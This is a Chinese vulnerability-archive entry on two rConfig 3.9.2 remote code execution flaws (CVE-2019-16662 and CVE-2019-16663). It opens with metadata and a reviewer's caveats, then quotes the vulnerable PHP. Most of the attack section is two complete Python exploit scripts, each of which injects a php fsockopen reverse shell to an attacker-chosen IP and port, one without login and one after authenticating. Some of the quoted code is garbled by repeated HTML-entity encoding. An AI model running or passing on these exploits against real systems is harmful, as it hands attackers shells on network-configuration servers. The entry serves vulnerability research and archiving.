---
cve: "CVE-2019-16662"
source: "Mr-xn/Penetration_Testing_POC"
id: "vw-14272730192ef83b7a6727bd"
entity_id: "ve-14272730192ef83b7a6727bd"
schema_version: "1"
title: "rConfig v3.9.2 RCE漏洞2"
product: "rConfig网络配置管理软件"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2019-16662"
referenced_identifiers: ""
prerequisites: "3.9.2，CentOS7.7/PHP7.2.22；16662需install目录保留，16663需登录"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/rConfig/rConfig%20v3.9.2%20RCE%E6%BC%8F%E6%B4%9E2.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/"
source_status: "recorded"
---

# rConfig v3.9.2 RCE漏洞2

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：rConfig网络配置管理软件
- 本文讨论：CVE-2019-16662未认证安装目录；16663认证search.crud
- 版本、权限与配置前提：3.9.2，CentOS7.7/PHP7.2.22；16662需install目录保留，16663需登录
- 资料类型：双RCE源码研究及脚本转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 元数据仅16662；PHP和载荷被多层HTML实体编码，catCommand查询分隔符也变&amp;amp;
- Python2代码未明确运行依赖；第二漏洞源码未附而依赖文字/脚本
- 本地PDF引用需Git树检查非图片资源是否存在
- 已落实的文本修订：补齐文章标题。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 固定版本、PDF引用存在性及原始源码待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## rConfig v3.9.2 RCE漏洞

## 0x00 前言

rConfig是一个开源网络设备配置管理解决方案，可以方便网络工程师快速、频繁管理网络设备快照。

我在rConfig的两个文件中找到了两个远程命令执行（RCE）漏洞，第一个文件为`ajaxServerSettingsChk.php`，攻击者可以通过`rootUname`参数发送精心构造的一个GET请求，触发未授权RCE漏洞。`rootUname`参数在源文件第2行中定义，随后会在第13行传递给`exec`函数。攻击者可以将恶意系统命令插入该参数中，在目标服务器上执行。该漏洞利用和发现过程比较简单，下文中我将介绍如何发现并利用该漏洞。

第二个漏洞位于`search.crud.php`文件中，存在RCE漏洞。攻击者可以发送精心构造的GET请求触发该漏洞，请求中包含两个参数，其中`searchTerm`参数可以包含任意值，但该参数必须存在，才能执行到第63行的`exec`函数。

我像往常一样想寻找RCE漏洞，因此我使用自己开发的一个[python脚本](https://github.com/mhaskar/RCEScanner)来搜索所有不安全的函数。

## 0x01 未授权RCE漏洞

运行脚本后，我看到了一些输出结果。检查文件后，我发现有个文件名为`ajaxServerSettingsChk.php`，具体路径为`install/lib/ajaxHandlers/ajaxServerSettingsChk.php`，部分代码如下：

```php
<?php
$rootUname = $_GET['rootUname'];    // line 2
$array = array();
/* check PHP Safe_Mode is off */
if (ini_get('safe_mode')) {
    $array['phpSafeMode'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;Fail - php safe mode is on - turn it off before you proceed with the installation&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;br/&amp;amp;gt;';
} else {
    $array['phpSafeMode'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - php safe mode is off&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
}

/* Test root account details */
$rootTestCmd1 = 'sudo -S -u ' . $rootUname . ' chmod 0777 /home 2&amp;amp;gt;&amp;amp;amp;1';    // line 12
exec($rootTestCmd1, $cmdOutput, $err);    // line 13
$homeDirPerms = substr(sprintf('%o', fileperms('/home')), -4);
if ($homeDirPerms == '0777') {
    $array['rootDetails'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;Good&amp;amp;quot;&amp;amp;gt;Pass - root account details are good &amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
} else {
    $array['rootDetails'] = '&amp;amp;lt;strong&amp;amp;gt;&amp;amp;lt;font class=&amp;amp;quot;bad&amp;amp;quot;&amp;amp;gt;The root details provided have not passed: ' . $cmdOutput[0] . '&amp;amp;lt;/strong&amp;amp;gt;&amp;amp;lt;/font&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;';
}
// reset /home dir permissions
$rootTestCmd2 = 'sudo -S -u ' . $rootUname . ' chmod 0755 /home 2&amp;amp;gt;&amp;amp;amp;1';    // line 21
exec($rootTestCmd2, $cmdOutput, $err);    // line 22

echo json_encode($array);
```

## POC x1

```python
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16662
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:
    print "[+] Usage : ./exploit.py target ip port"
    exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(''';php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port))

install_path = target + "/install"

req = requests.get(install_path, verify=False)
if req.status_code == 404:
    print "[-] Installation directory not found!"
    print "[-] Exploitation failed !"
    exit()
elif req.status_code == 200:
    print "[+] Installation directory found!"
url_to_send = target + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + payload

print "[+] Triggering the payload"
print "[+] Check your listener !"

requests.get(url_to_send, verify=False)

```

## POC x2

```python
#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16663
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22


import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print "[+] Usage : ./exploit.py target username password ip port"
    exit()

target = sys.argv[1]

username = sys.argv[2]

password = sys.argv[3]

ip = sys.argv[4]

port = sys.argv[5]

request = requests.session()

login_info = {
    "user": username,
    "pass": password,
    "sublogin": 1
}

login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)


if dashboard_request.status_code == 200:
    print "[+] LoggedIn successfully"
    payload = '''""&amp;&amp;php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port)
    encoded_request = target+"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}".format(quote(payload))
    print "[+] triggering the payload"
    print "[+] Check your listener !"
    exploit_req = request.get(encoded_request)

elif dashboard_request.status_code == 302:
    print "[-] Wrong credentials !"
    exit()
```

### 原文： https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/ 

### 英译中： https://www.anquanke.com/post/id/189795 

### PDF版本：[本地：rConfig v3.9.2 RCE漏洞分析.pdf](./books/rConfig%20v3.9.2%20RCE漏洞分析.pdf)


---

> 来源：Mr-xn/Penetration_Testing_POC
